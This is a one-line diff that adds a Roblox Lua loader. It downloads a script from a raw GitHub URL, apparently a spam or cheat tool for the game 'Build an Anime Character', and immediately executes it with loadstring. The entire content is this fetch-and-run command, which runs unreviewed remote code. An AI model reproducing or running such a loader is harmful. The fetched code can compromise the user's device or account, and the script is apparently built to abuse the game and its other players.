@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/GrandLobsterFill/loaders/main/loaders/build-an-anime-character-spam7-8xnvwu3oonifm7.lua"))()
